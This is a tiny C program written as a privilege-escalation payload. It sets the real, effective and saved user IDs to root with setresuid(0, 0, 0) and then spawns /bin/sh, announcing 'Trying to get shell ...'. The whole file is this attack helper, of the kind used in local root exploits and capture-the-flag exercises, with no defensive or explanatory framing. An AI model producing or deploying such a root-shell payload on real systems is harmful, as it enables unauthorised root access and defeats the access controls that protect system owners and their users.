#include <stdio.h>
#include <stdlib.h>

int main()
{
   printf("Trying to get shell ...\n");
   setresuid(0, 0, 0);
   system("/bin/sh");
   return 0;
}
